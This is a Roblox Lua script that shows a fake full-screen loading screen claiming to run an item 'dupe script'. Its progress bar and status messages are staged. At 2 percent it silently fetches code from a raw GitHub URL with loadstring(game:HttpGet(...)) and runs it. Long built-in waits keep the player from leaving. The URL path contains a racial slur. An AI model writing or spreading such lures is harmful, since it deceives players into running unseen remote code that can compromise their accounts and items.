local TweenService = game:GetService("TweenService")
local p = game.Players.LocalPlayer
local g = Instance.new("ScreenGui", p:WaitForChild("PlayerGui"))
g.Name = "LoadingUI"
g.IgnoreGuiInset = true
g.ResetOnSpawn = false
g.DisplayOrder = 9999

-- Pure Black Background
local bg = Instance.new("Frame", g)
bg.Size = UDim2.new(10, 0, 10, 0)
bg.Position = UDim2.new(-5, 0, -5, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BackgroundTransparency = 0
bg.ZIndex = 1

-- Center UI Frame
local f = Instance.new("Frame", g)
f.Size = UDim2.new(0.45, 0, 0.5, 0)
f.Position = UDim2.new(0.275, 0, 0.25, 0)
f.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
f.ZIndex = 2
Instance.new("UICorner", f).CornerRadius = UDim.new(0, 14)

-- "IF YOU STUCK" Tip
local tip = Instance.new("TextLabel", f)
tip.Size = UDim2.new(1, 0, 0.08, 0)
tip.Position = UDim2.new(0, 0, 0.05, 0)
tip.BackgroundTransparency = 1
tip.Font = Enum.Font.GothamSemibold
tip.TextScaled = true
tip.TextWrapped = true
tip.TextColor3 = Color3.new(1, 1, 1)
tip.Text = "⚠️🚨 IF YOU STUCK TRY TO REJOIN"

-- Retry Button
local retryBtn = Instance.new("TextButton", f)
retryBtn.Size = UDim2.new(0.5, 0, 0.1, 0)
retryBtn.Position = UDim2.new(0.25, 0, 0.15, 0)
retryBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 250)
retryBtn.Text = "🔁 Retry 🔧"
retryBtn.TextScaled = true
retryBtn.TextColor3 = Color3.new(1, 1, 1)
retryBtn.Font = Enum.Font.GothamBold
retryBtn.Visible = false
Instance.new("UICorner", retryBtn).CornerRadius = UDim.new(0, 10)

-- Loading Title
local loadingText = Instance.new("TextLabel", f)
loadingText.Size = UDim2.new(1, 0, 0.08, 0)
loadingText.Position = UDim2.new(0, 0, 0.27, 0)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamSemibold
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.TextScaled = true
loadingText.Text = "🚀🔄 Loading Script..."

-- Animate Dots
local running = true
task.spawn(function()
	local dot = 0
	while running and loadingText.Parent do
		loadingText.Text = "🚀🔄 Loading Script" .. string.rep(".", dot % 4)
		dot += 1
		wait(0.5)
	end
end)

-- Progress Bar Frame
local pb = Instance.new("Frame", f)
pb.Size = UDim2.new(0.85, 0, 0.1, 0)
pb.Position = UDim2.new(0.075, 0, 0.38, 0)
pb.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Instance.new("UICorner", pb).CornerRadius = UDim.new(0, 12)

-- Progress Bar Fill
local bar = Instance.new("Frame", pb)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 140)
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 12)

-- % Text
local percent = Instance.new("TextLabel", pb)
percent.Size = UDim2.new(1, 0, 1, 0)
percent.BackgroundTransparency = 1
percent.TextColor3 = Color3.new(1, 1, 1)
percent.Font = Enum.Font.GothamBold
percent.TextScaled = true
percent.Text = "0% Complete"

-- Status Label (Below progress bar)
local status = Instance.new("TextLabel", f)
status.Size = UDim2.new(1, 0, 0.08, 0)
status.Position = UDim2.new(0, 0, 0.50, 0)
status.BackgroundTransparency = 1
status.Font = Enum.Font.Gotham
status.TextScaled = true
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.Text = "🔍 Scanning environment..."

-- Info Message
local info = Instance.new("TextLabel", f)
info.Size = UDim2.new(1, 0, 0.09, 0)
info.Position = UDim2.new(0, 0, 0.65, 0)
info.BackgroundTransparency = 1
info.Font = Enum.Font.GothamSemibold
info.TextColor3 = Color3.fromRGB(200, 200, 200)
info.TextScaled = true
info.TextWrapped = true
info.Text = "⏳🛠️ PLEASE WAIT WE ARE CURRENTLY EXECUTING THE DUPE SCRIPT. THIS MAY TAKE A MOMENT. DON'T LEAVE."

-- Footer
local credit = Instance.new("TextLabel", f)
credit.Size = UDim2.new(1, 0, 0.06, 0)
credit.Position = UDim2.new(0, 0, 0.92, 0)
credit.BackgroundTransparency = 1
credit.Font = Enum.Font.GothamSemibold
credit.TextColor3 = Color3.fromRGB(170, 170, 170)
credit.TextScaled = true
credit.Text = "👨‍💻 Script by @growyourowngarden"

-- Status by % logic
local function getStatus(i)
	if i < 20 then return "🔍 Scanning environment..."
	elseif i < 40 then return "📦 Loading assets..."
	elseif i < 60 then return "⚙️ Preparing functions..."
	elseif i < 80 then return "📡 Connecting to server..."
	else return "🚀 Finalizing execution..."
	end
end

-- Progress Logic
local function fillProgress()
	running = true
	bar.Size = UDim2.new(0, 0, 1, 0)
	percent.Text = "0% Complete"

	for i = 1, 100 do
		local tSize = UDim2.new(i / 100, 0, 1, 0)
		TweenService:Create(bar, TweenInfo.new(0.25, Enum.EasingStyle.Sine), { Size = tSize }):Play()
		percent.Text = i .. "% Complete"
		status.Text = getStatus(i)

		if i == 2 then
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Laggs/walapatoniggaa/refs/heads/main/gragraj"))()
			end)
		end

		if i == 50 or i == 60 then
			wait(2)
		elseif i == 80 or i == 90 then
			wait(60)
		else
			wait(math.random(8, 20) / 100)
		end
	end

	running = false
	retryBtn.Visible = true
end

-- Begin
fillProgress()

-- Retry logic
retryBtn.MouseButton1Click:Connect(function()
	retryBtn.Visible = false
	fillProgress()
end)
